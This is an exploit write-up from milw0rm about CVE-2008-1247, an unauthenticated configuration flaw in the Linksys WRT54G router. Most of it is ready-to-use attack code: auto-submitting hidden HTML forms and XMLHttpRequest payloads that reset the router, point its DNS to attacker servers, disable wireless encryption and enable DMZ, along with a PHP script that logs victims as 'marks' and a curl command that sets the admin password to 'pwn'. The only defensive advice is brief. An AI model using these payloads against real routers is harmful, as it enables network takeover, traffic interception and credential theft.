	 __  _  ____  ____    ___   ____  ____  ____   _____      ____  ____   _____   ___
	|  l/ ]l    j|    \  /   \ |    \l    j|    \ |     T    l    j|    \ |     | /   \
	|  ' /  |  T |  _  YY     Y|  o  )|  T |  _  Yl__/  |     |  T |  _  Y|   __jY     Y
	|    \  |  | |  |  ||  Q  ||   _/ |  | |  |  ||   __j     |  | |  |  ||  l_  |  O  |
	|     Y |  | |  |  ||     ||  |   |  | |  |  ||  /  | __  |  | |  |  ||   _] |     |
	|  .  | j  l |  |  |l     ||  |   j  l |  |  ||     ||  T j  l |  |  ||  T   l     !
	l__j\_j|____jl__j__j \__,_jl__j  |____jl__j__jl_____jl__j|____jl__j__jl__j    \___/

				<>< | ><> Hacking the Linksys WRT54G #2
				<>< | ><> https://kinqpinz.info/
				<>< | ><> by meathive
				<>< | ><> root at kinqpinz.info && kinqpinz.info at gmail.com

				
++| CVE-2008-1247
----------------------
The web interface on the Linksys WRT54g router with firmware 1.00.9 does not require credentials 
when invoking scripts, which allows remote attackers to perform arbitrary administrative actions via
a direct request to (1) Advanced.tri, (2) AdvRoute.tri, (3) Basic.tri, (4) ctlog.tri, (5) ddns.tri, 
(6) dmz.tri, (7) factdefa.tri, (8) filter.tri, (9) fw.tri, (10) manage.tri, (11) ping.tri, 
(12) PortRange.tri,(13) ptrigger.tri, (14) qos.tri, (15) rstatus.tri, (16) tracert.tri, 
(17) vpn.tri, (18) WanMac.tri, (19) WBasic.tri, or (20) WFilter.tri.
NOTE: the Security.tri vector is already covered by CVE-2006-5202.

++| Intro
----------------------
This text is in addition to the findings I have already made public regarding the Linksys WRT54G 
wireless router and firewall gateway device. The scripts that process configuration changes do not 
require authentication and therefore can be altered _remotely_ via simple form submissions written 
in HTML and submitted using JavaScript. Please refer to the bottom of this text for my previous 
findings and the demo page with sample exploits.

++| Let's Get Dirty
----------------------
You may find my original demonstration page at https://kinqpinz.info/lib/wrt54g/. It basically shows
how forms can be constructed in HTML that take advantage of the major flaws present within the 
insecure router. In my previous documentation I showed how it is possible to alter configuration 
parameters both via Linux command line using curl and HTML form submissions. In this text I 
demonstrate how to do these very same things transparently using a combination of HTML form 
construction with JavaScript that automagically submits our desired changes.

The JavaScript is simple and is only used for submitting the form - a user-free mechanism that will 
redirect the user to their router and prompts them to log in. Once again, THE REQUEST TO 
AUTHENTICATE TO THE DEVICE IS NOT REQUIRED IN ORDER TO CHANGE ITS SETTINGS. The following is all 
that is required in order to submit our form that will be constructed using GET parameters observed 
from the device's Web interface.

document.f.submit();

This submits forms hidden within the Webpage. Our first example code enables wireless access with an
SSID of our choosing. In this instance, I will use the SSID "kinqpinz".

<form name="f" action="http://192.168.1.1/WBasic.tri" method="POST">
  <input type="hidden" name="submit_type" value="">
  <input type="hidden" name="channelno" value="11">
  <input type="hidden" name="OldWirelessMode" value="3">
  <input type="hidden" name="Mode" value="3">
  <input type="hidden" name="SSID" value="kinqpinz">
  <input type="hidden" name="channel" value="6">
  <input type="hidden" name="Freq" value="6">
  <input type="hidden" name="wl_closed" value="1">
  <input type="hidden" name="sesMode" value="1">
  <input type="hidden" name="layout" value="en">
</form>

The reason this works is simple: configuration parameters are constructed in the URL in the Web 
interface, hosted by default at the address http://192.168.1.1. One can view these parameters while 
configuring their device. The code above simply constructs a URL that is processed by the router's 
IOS script WBasic.tri. The URL resembles the following if you were to view it within your browser:

http://192.168.1.1/WBasic.tri?submit_type=&channelno=11&OldWirelessMode=3&Mode=3&SSID=kinqpinz&channel=6&Freq=6&wl_closed=1&sesMode=1&layout=en

It's simple enough to understand what's going on. Each variable passed in the URL describes exactly 
what its purpose is - at least the important ones such as "SSID" and "channel". The only tricky part 
to exploiting the router is the fact that you cannot alter settings using a URL like the one above. 
That would result in a GET request on behalf of the device, whereas we're interested in POST 
requests that actually trigger configuration changes. A GET request does nothing. Below I describe 
a real world attack scenario that makes use of knowledge about the device, embedded HTML + JavaScript, 
and a touch of PHP to grab the mark's external IP. 

++| Remote Real World Attack Scenario
----------------------
So http://www.hacker.tld hosts an evil page that wants to compromise your Linksys WRT54G router. It 
has made a few assumptions about your environment, however. One major assumption is that you've 
kept your router's default local gateway address, namely 192.168.1.1. No matter what other changes 
you've made to the router in terms of security, e.g., strong password, wireless encryption, access 
restrictions - they are useless. So this brings us to an important lesson concerning the WRT54G: do 
NOT retain the default local address of 192.168.1.1. It is pertinent that you change this address so 
that you do not fall victim to a malicious individual hosting code that will be presented in this 
text.

++| Remote Real World Attack Scenario Requirements
----------------------
On http://www.hacker.tld a page is hosted that contains the following:
  (1) hidden HTML forms that contain the values/params needed to configure the WRT54G remotely;
  (2) JavaScript that submits these forms transparently;
  (3) PHP or similar server-side code that acquires the mark's external IP address as they browse 
  the page; and,
  (4) PHP or similar server-side code that retains the mark's external IP address in the event that 
  the remote form submission is successful, thus allowing the remote attacker to further exploit the 
  device.

http://www.hacker.tld/index.php contains the following code for achieving its purpose. To begin, PHP 
is used - though any server-side language is suitable - for obtaining the external IP of any 
individual viewing the exploit page and writes this information to a log file.
<?php
  $ip=$_SERVER['REMOTE_ADDR'];
  $toWrite="Potential mark resides at $ip\n\n";
  $f=fopen("mark.txt", "a+");
  fwrite($f, $toWrite);
  fclose($f);
?>

The JavaScript is as simple as retrieving the form object identified by the 'name' HTML attribute 
and submitting the form.

<script type="text/javascript">
  document.f.submit();
</script>

All hacker.tld needs now is the forms used to store the URL params, conveniently hidden using the
HTML form's 'hidden' attribute.

<form name="f" action="http://192.168.1.1/WBasic.tri" method="POST">
  <input type="hidden" name="submit_type" value="">
  <input type="hidden" name="channelno" value="11">
  <input type="hidden" name="OldWirelessMode" value="3">
  <input type="hidden" name="Mode" value="3">
  <input type="hidden" name="SSID" value="kinqpinz">
  <input type="hidden" name="channel" value="6">
  <input type="hidden" name="Freq" value="6">
  <input type="hidden" name="wl_closed" value="1">
  <input type="hidden" name="sesMode" value="1">
  <input type="hidden" name="layout" value="en">
</form>

What you should observe from this is the form name of "f" which is used in the JS to submit the form 
as well as the various 'name' and 'value' attributes that are used to create a URL such as this:

submit_type=&channelno=11&OldWirelessMode=3&Mode=3&SSID=kinqpinz&channel=6&Freq=6&wl_closed=1&sesMode=1&layout=en

Do note that without any one of these parameters, the exploit fails and nothing changes. All of the 
elements must remain in place even if they do not directly make sense. They are simply options that 
the processing script, in this case WBasic.tri, requires prior to fulfilling the request. Case 
matters and do not forget that the request must be POST, not GET. Also different config changes 
require different scripts, so WBasic.tri is not used for, say, enabling/disabling the firewall log.

Now that the malicious page has been composed and sits online living and waiting for marks at 
http://www.hacker.tld/index.php, as each request is made to the page it is logged using our custom 
PHP logging script. In mark.txt, our logging file, sample output would resemble something like the 
following.

Potential mark resides at 1.1.1.1

Potential mark resides at 2.2.2.2

Potential mark resides at 3.3.3.3

So forth...

They are potential marks because it is unknown whether or not they are using the WRT54G with a 
supported firmware version that is exploitable using these techniques, and/or the exploit attempt 
failed, perhaps because our mark cancelled the request before it could be fulfilled, or they are not 
using the default local address (good for them) that this attack relies on.

When they browse the page, because we have set no timeout for this change to occur, they are 
instantly redirected to http://192.168.1.1/WBasic.tri. The URL, because it is not a GET request, 
does not inform the user if they were educated enough of what has just happened, so they may 
continue on doing whatever they were doing, more often than not unaware of what has just happened. 
At the same time our PHP script has logged this access attempt to mark.txt which we can retrieve at 
our leisure and further test the remote host whether or not they are vulnerable to attack. At the 
very least, we may decide to completely reset the router to rest assured we know its current state 
to make further compromise a snap, such as altering the device's DNS records for sniffing traffic. 
This is quite feasible, here's how.

<form method="post" action="http://192.168.1.1/factdefa.tri">
  <input type="hidden" name="FactoryDefaults" value="Yes">
  <input type="hidden" name="layout" value="en">
  <input type="submit">
</form>

This gives us the following URL: http://192.168.1.1/factdefa.tri?FactoryDefaults=Yes&layout=en

Now we can change the DNS again at our leisure, perhaps to our own DNS server that intercepts/logs 
all incoming and outgoing requests before passing them on to the next in line.

<form method="post" action="http://192.168.1.1/Basic.tri">
  <input type="hidden" name="dhcp_end" value="149">
  <input type="hidden" name="oldMtu" value="1500">
  <input type="hidden" name="oldLanSubnet" value="0">
  <input type="hidden" name="OldWanMode" value="0">
  <input type="hidden" name="SDHCP1" value="192">
  <input type="hidden" name="SDHCP2" value="168">
  <input type="hidden" name="SDHCP3" value="1">
  <input type="hidden" name="SDHCP4" value="100">
  <input type="hidden" name="EDHCP1" value="192">
  <input type="hidden" name="EDHCP2" value="168">
  <input type="hidden" name="EDHCP3" value="1">
  <input type="hidden" name="EDHCP4" value="150">
  <input type="hidden" name="pd" value="">
  <input type="hidden" name="now_proto" value="dhcp">
  <input type="hidden" name="old_domain" value="">
  <input type="hidden" name="chg_lanip" value="192.168.1.1">
  <input type="hidden" name="_daylight_time" value="1">
  <input type="hidden" name="wan_proto" value="0">
  <input type="hidden" name="router_name" value="WRT54G">
  <input type="hidden" name="wan_hostname" value="">
  <input type="hidden" name="wan_domain" value="">
  <input type="hidden" name="mtu_enable" value="0">
  <input type="hidden" name="lan_ipaddr_0" value="192">
  <input type="hidden" name="lan_ipaddr_1" value="168">
  <input type="hidden" name="lan_ipaddr_2" value="1">
  <input type="hidden" name="lan_ipaddr_3" value="1">
  <input type="hidden" name="lan_netmask" value="0">
  <input type="hidden" name="lan_proto" value="Enable">
  <input type="hidden" name="dhcp_start" value="100">
  <input type="hidden" name="dhcp_num" value="50">
  <input type="hidden" name="dhcp_lease" value="0">
  <input type="hidden" name="dns0_0" value="1">
  <input type="hidden" name="dns0_1" value="2">
  <input type="hidden" name="dns0_2" value="3">
  <input type="hidden" name="dns0_3" value="4">
  <input type="hidden" name="dns1_0" value="5">
  <input type="hidden" name="dns1_1" value="6">
  <input type="hidden" name="dns1_2" value="7">
  <input type="hidden" name="dns1_3" value="8">
  <input type="hidden" name="dns2_0" value="9">
  <input type="hidden" name="dns2_1" value="8">
  <input type="hidden" name="dns2_2" value="7">
  <input type="hidden" name="dns2_3" value="6">
  <input type="hidden" name="wins_0" value="0">
  <input type="hidden" name="wins_1" value="0">
  <input type="hidden" name="wins_2" value="0">
  <input type="hidden" name="wins_3" value="0">
  <input type="hidden" name="time_zone" value="%28GMT-08%3A00%29+Pacific+Time+%28USA+%26+Canada%29">
  <input type="hidden" name="daylight_time" value="ON">
  <input type="hidden" name="layout" value="en">
  <input type="submit">
</form>

This is indeed convoluted but all of these values must be in place in order to be successful. What 
is it doing? It overrides whatever DNS settings were set either by our mark or by their ISP with our 
own custom values, in this instance DNS server #1 is set to 1.2.3.4, DNS server #2 is set to 5.6.7.8, 
and DNS server #3 is set to 9.8.7.6. Typically these values are populated by the router itself while 
obtaining its dynamic IP from the ISP. In case you're curious, these forms are used to construct the 
following URL that is submitted to http://192.168.1.1/Basic.tri.

http://192.168.1.1/Basic.tri?dhcp_end=149&oldMtu=1500&oldLanSubnet=0&OldWanMode=0&SDHCP1=192&SDHCP2=168&SDHCP3=1&SDHCP4=100&EDHCP1=192&EDHCP2=168&EDHCP3=1&EDHCP4=150&pd=&now_proto=dhcp&old_domain=&chg_lanip=192.168.1.1&_daylight_time=1&wan_proto=0&router_name=WRT54G&wan_hostname=&wan_domain=&mtu_enable=0&lan_ipaddr_0=192&lan_ipaddr_1=168&lan_ipaddr_2=1&lan_ipaddr_3=1&lan_netmask=0&lan_proto=Enable&dhcp_start=100&dhcp_num=50&dhcp_lease=0&dns0_0=1&dns0_1=2&dns0_2=3&dns0_3=4&dns1_0=5&dns1_1=6&dns1_2=7&dns1_3=8&dns2_0=9&dns2_1=8&dns2_2=7&dns2_3=6&wins_0=0&wins_1=0&wins_2=0&wins_3=0&time_zone=%28GMT-08%3A00%29+Pacific+Time+%28USA+%26+Canada%29&daylight_time=ON&layout=en

++| An Alternative (with JavaScript)
----------------------
This is the basic exploitation method of the router although the attacker has many alternatives of 
submitting configuration changes assuming you allow client-side scripts to execute, namely JavaScript. 
A few alternative methods would include using a JavaScript onClick function within a standard 
looking HTML anchor tag to submit the information with XMLHttpRequest, e.g.:

<a href="/path/" onClick="xhrRequest();">This looks innocent enough.</a>

...where xhrRequest uses and submits preset configuration parameters upon our mark clicking on this 
standard looking navigation link, e.g.:

var xhr=false;
if(window.XMLHttpRequest) {
  xhr=new XMLHttpRequest();
} else if(window.ActiveXObject) {
  xhr=new ActiveXObject("Microsoft.XMLHTTP");
}
function xhrRequest() {
  if(xhr) {
    xhr.open("POST", "http://192.168.1.1/Security.tri", true);
    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    xhr.onreadystatechange=function() {
      if(xhr.readyState == 4 && xhr.status == 200) {
        var success=xhr.responseText;
      }
    }
  xhr.send("SecurityMode=0&layout=en");
  }
}

The example above effectively disables all wireless encryption so that if you happen to live close 
enough to this poor individual, it is your duty to pwn their wireless by enabling open access for 
everybody in the neighborhood! Here's the URL for disabling wireless encryption:

http://192.168.1.1/Security.tri?SecurityMode=0&layout=en

++| An Alternative (without JavaScript)
----------------------
You're still exploitable even if you do not allow scripts from executing, e.g., you use Firefox + 
NoScript. Our hackerific page hosted at http://www.hacker.tld/index.php can still use innocent 
looking methods of compromising your WRT54G. For example, user registration for a bulletin board or 
forum system. The site must acquire a minimal amount of information in order to create the account 
so it is in submitting this data that we may submit our own payload, perhaps this time we'd like to 
enable DMZ for complete access to any and all shares/services on our mark's computer. Here is the 
URL once again:

http://192.168.1.1/dmz.tri?action=Apply&dmz_enable=1&dmz_ipaddr=100&layout=en

Again it is a different script processing the request on behalf of the router's internal operating 
system, dmz.tri, but it still does not require authentication prior to changing the settings we wish 
to change. All hacker.tld must do is replace the HTML payload with what he/she wishes to alter, e.g.:

<form method="post" action="http://192.168.1.1/dmz.tri">
  <input type="hidden" name="action" value="Apply">
  <input type="hidden" name="dmz_enable" value="1">
  <input type="hidden" name="dmz_ipaddr" value="100">
  <input type="hidden" name="layout" value="en">

...and add these values to their user registration page with standard username/password/e-mail fields...
 
 Username: <input type="text" name="username"><br>
 Password: <input type="password" name="password1"><br>
 Confirm Password: <input type="password" name="password2"><br>
 <input type="submit">
</form>

...that can be found on traditional forums these days. The mark submits and exploits his/her own 
router although they believe they are at least minimally technically savvy by using a combination of 
technologies (Firefox, NoScript) to combat hackers and their methodologies. It works since the forms 
we use to store the router configs are hidden, and the normal user registration forms are not, thus 
it is unknown the nature of what supplementary data hacker.tld has appended. Even if the mark has 
detected that a potential attack is taking place it is likely too late as the mastermind behind 
http://www.hacker.tld/ is running a tail -f on his/her Web server logs to immediately snatch up 
targets. Once a request is submitted, the hacker knows the Linksys WRT54G makes configuration 
changes within 10 seconds, which is plenty of time for them to open another terminal and change the 
administrative login to block our mark from changing their settings, e.g.:

curl -d "remote_mgt_https=0&http_enable=1&https_enable=0&PasswdModify=1&http_passwd=pwn&http_passwdConfirm=pwn&_http_enable=1&web_wl_filter=1&remote_management=0&upnp_enable=1&layout=en" http://<REMOTE_EXTERNAL_ADDR>/manage.tri

Here the hacker can now log in as admin with password 'pwn' with complete freedom to _REMOTELY_ 
monitor the mark's internal and outgoing network traffic. This can allow for capturing passwords 
via DNS poisoning on the router, man-in-the-middle attacks by pointing the local address of the 
router to a rogue DHCP server and accordingly, rogue network of the attacker's, plus more.

++| Conclusion
----------------------
It is my intention in finalizing this document that the reader understands that the Linksys WRT54G 
firmware version 1.00.9 does not care if you inside or outside its local network. Nor does it care 
whether or not you have the level of privilege thought to be necessary for manipulating sensitive 
objects.

Thanks go to hw2B for suggesting I write all of this garbage out. 

++| URLs
----------------------
https://kinqpinz.info/lib/wrt54g/ (demonstration page with embedded HTML forms found in this document)
https://kinqpinz.info/lib/wrt54g/own.txt (initial findings from February 2008)
https://kinqpinz.info/lib/wrt54g/own2.txt (this document)
http://nvd.nist.gov/nvd.cfm?cvename=CVE-2008-1247 (CVE-2008-1247)

# milw0rm.com [2008-06-24]